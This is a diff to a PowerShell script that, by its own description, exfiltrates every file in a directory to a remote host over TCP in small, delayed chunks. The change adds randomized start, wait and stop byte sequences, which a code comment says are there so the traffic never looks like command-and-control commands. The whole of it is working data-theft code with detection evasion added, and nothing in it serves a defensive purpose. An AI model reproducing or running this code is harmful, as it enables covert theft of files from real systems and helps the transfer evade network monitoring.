@@ -10,6 +10,7 @@
 	.DESCRIPTION
 		Exfil all files in a directory to remote client over a period of time, in small chunks.
 #>
+
 param (
 	[parameter(
 		Mandatory = $true		
@@ -32,6 +33,14 @@ param (
 	)]
 	[string] $buffer = 4096
 )
+
+function generateCMDs ($delta)
+{
+	$CMD = New-Object Byte[] ($buffer + $delta)
+	(New-Object System.Random).NextBytes($CMD)
+
+return $CMD	
+}
 
 function sendBytes ($chunk)
 {
@@ -66,9 +75,14 @@ function TCPConnect($ip, $port)
 $client = TCPConnect $remote $remote_port
 $items = Get-ChildItem -Path $path
 
+# Dynamic cmds to send to the rx. This way the data in the packet(s) will never look like C2 cmds 
+$start = generateCMDs 1
+$wait = generateCMDs 2
+$stop = generateCMDs 3
+
 foreach ($item in $items)
 {
-	sendBytes($chunk)
+	sendBytes($start)
 	
 	# Ignore directories now. Probably traverse them later?
 	if ($item.Attributes -ne "Directory")
@@ -78,9 +92,12 @@ foreach ($item in $items)
 		{
 			[byte[]]$chunk = $file_bytes[$i..($i+$buffer)]
 			sendBytes($chunk)
+			sendBytes($wait)
 			Start-Sleep -m $delay
 		}
 	}
+
+	sendBytes($stop)
 }
 
 $client.Close()
